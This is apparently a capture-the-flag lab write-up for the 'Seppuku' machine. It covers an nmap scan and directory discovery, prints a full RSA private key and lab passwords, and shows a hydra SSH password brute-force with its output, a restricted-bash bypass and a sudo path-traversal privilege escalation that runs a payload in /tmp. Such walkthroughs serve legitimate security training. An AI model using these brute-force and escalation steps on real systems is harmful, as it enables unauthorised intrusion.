ip : 192.168.51.90

## Nmap Scan

```
nmap -p- -A -sC 192.168.51.90
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 06:20 EDT
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 25.00% done; ETC: 06:20 (0:00:18 remaining)
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 62.50% done; ETC: 06:20 (0:00:07 remaining)
Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.10% done; ETC: 06:20 (0:00:00 remaining)
Nmap scan report for 192.168.51.90
Host is up (0.0042s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd55a8e40f28bcb2a67d4176bb9f71f4 (RSA)
|   256 16fa29e4e08a2e7d37d26f42b2dce922 (ECDSA)
|_  256 bb74e897fa308ddaf95c99f0d9248ad5 (ED25519)
80/tcp   open  http          nginx 1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-title: 401 Authorization Required
|_http-server-header: nginx/1.14.2
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
7080/tcp open  ssl/empowerid LiteSpeed
|_http-title: Did not follow redirect to https://192.168.51.90:7080/
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US
| Not valid before: 2020-05-13T06:51:35
|_Not valid after:  2022-08-11T06:51:35
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
|_http-server-header: LiteSpeed
7601/tcp open  http          Apache httpd 2.4.38 ((Debian))
|_http-title: Seppuku
|_http-server-header: Apache/2.4.38 (Debian)
8088/tcp open  http          LiteSpeed httpd
|_http-title: Seppuku
|_http-server-header: LiteSpeed
Service Info: Host: SEPPUKU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-22T10:20:27
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: seppuku
|   NetBIOS computer name: SEPPUKU\x00
|   Domain name: \x00
|   FQDN: seppuku
|_  System time: 2023-05-22T06:20:29-04:00
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.99 seconds

```

- Checking the http connection on port 7601

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/317ebc33-585a-4442-b779-2eb6fe4daf48)
 
## Directory search
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/6e19faaa-c40c-4e1f-84d8-fec81dbf512f)

- Found two directories , `keys` & `secret`

- In keys there is a private key
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAypJlwjKXf0F4YvL2gfwvoUuvB7fuGMMfCe41gLCsTsleOUy2
CJX+oNwVVKPpl6TYI4nXPGbiwfGzoxm0FZa7D9yr83OgwuvMMp83OkVcwL9v+x7a
tK8AAVZ0NjvOPGkvEhB2rPS2mKg1xRKXCM7pA0KSOoDbk9coOpadjg4G0f1YPWrw
p6iLfIErfY2+5hS7QyTQpuRmHuR4eKLF1NFRp8gYuNCVtr0n2Uu6hWuI7RWBGQZJ
Joj8LKjfRRYmKGpyqiGTdRy+8yCyAuT55shuCzXuc+/3HE2jACOD8+pSPKjwxzm4
fuaSfBTUkHfyhiSKIkop2YfIDLKRPM8dGn5zuQIDAQABAoIBADM+s7Vb3Q1ZP54w
foHFjTsNjVqzge0Lt1doxmomx4Aq2sY+DLLBVyfUZSUDTj2JexAKd8OU93o+rcXt
46uudOX/WhR9RMbqpb6MnokEMQGlrCtn08Xvm127RCzQFk0cAsdcGNmKEoMt0mRn
XoPg6/tiJOHd5S5SOKARqAveqoUGUYI3xgsiRpj8CCRIDUgHi9J0++qUeauVw3m3
lvyTnUTw0uf5+sRkI173CUY+ygJapGM7Lg59xzcjEq5H4so0IztQo3o/pOIfeS6W
bqIpY7D63YBGLgpi9JcN/d2bSfafkfhcrAcjPjRXwEFPmYjMbsTBOKcTtCSDVo6/
ho6fTl0CgYEA9F1uIkqxFKIMt2/uK4/1gPOXy/1cjxcsFoah0Ql7d0gj26H6AgXk
nPncIoO1kojPnB+TUy4qz+Bd7teDbkHSaWNJYIVJZQbvskstwgL4+XamiWrJA/Jp
h7y0I0zRxCMBj5yhBNrp6P+f8vtVMpjbKV17jfe6aakfyuayPugHHh8CgYEA1DeM
4lR/+/fUbxtws+aTx8h9TwisYq38D39KNsWkynnb+9pnLCbVbVETtv4sfD/aQfah
R7CxOG+mD4Vryjpk/wwzZeUDzcQpiTx4RsgP6MkFU8knORKfBdimaUpiasWlNWgy
caXR/iA6EmA4jht8vf/+UOUV8GXV9VqDIWUhgycCgYEAvJaGcqyWMUhG7CLT+oal
f5l/Iw0rq7rEabYJmBvrT0k7czt0iK8nmgYy3+gp7ybqoqCzwFQ28itEExn78tGV
o4Pek0EKPY+22TCv5bUJlOz+5bql3AfvbbQyibO1h9tETyMgGXEhaJIvTQSu4deZ
/DiLLCttkDHXuW2FTosfQx0CgYEAkhGOSjapRRBHSxaTE3Cw5UFNZvnsVZu1tCEE
PwD5NVh9HzQr8YrlOnIk5L68deUpYF/WkNbAlLzcizBlifN5kseeFRN188qCYHCb
xPRtZuf+X7ZD5he4FzkRCcXmSeGynjkTB4CAMq+R6RYLt1yaFtk9/gZAfJBLna5o
NbM7Rt8CgYA5oPRfIpKZ5G9LJEAsBUONgBsrpXs+816ZEvBGsqPs/NPhhZMFetKm
RXxYAiEUudMsahP4Woeuxy8kWfM2J2ltwC/HRFuKnKfsHBhsn/FilspYfrafr985
tFnL/K9Z8le1saEGjwCu6zKto7CaFjj2D4Y9ji0sHGBO+tVbtmU/Jg==
-----END RSA PRIVATE KEY-----

```

- In `secret` directory we got hostname and password list

## SSH enumuration

```
hydra -l seppuku -P password.lst 192.168.51.90 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-22 06:50:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 93 login tries (l:1/p:93), ~6 tries per task
[DATA] attacking ssh://192.168.51.90:22/
[22][ssh] host: 192.168.51.90   login: seppuku   password: eeyoree
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-22 06:51:27

```
- Thats Awesome 😃 , we got the password
- SSH using the hostname and pass that we got 
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/6a97beb9-658d-415a-ba50-124a385e1929)

- tried something but not workout 🥺
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/6e06aa8f-1a89-4cbc-a6ec-2700ef32000f)

- This also had restricted bash as previous challenge
- so using ` ssh seppuku@192.168.51.90 -t "bash" ` , we can access it

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/1edcf163-74e8-452d-82b9-cd307f2da3eb)

- Found there are 3 users, may be the hidden passwd is for that user
`12345685213456!@!@A`
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/1a3a4d06-bb44-4c0c-8db6-737971f09e80)

- For checking that user command permissions as root user , we used `sudo -l`
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/b6bf1b45-c48f-4229-a2b9-5c34ce931ca5)


## Privilage escalation

- we can't able to enter into third user as we don't have any password, but we have found one sshkey before 

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/0c952d8b-1ab3-4b3d-8325-3bdb929a56b7)

- now trying the command `/../../../../../../home/tanto/.cgi_bin/bin /tmp/*`

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/3b97c6eb-7668-43ca-b466-475663b06ab6)

- Don't forgot to make a payload file excecutable , in suset decoy, challenge same mistake takes a week to solve.


![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/d9dbce48-4b95-4c91-ade5-42063b6f5e62)



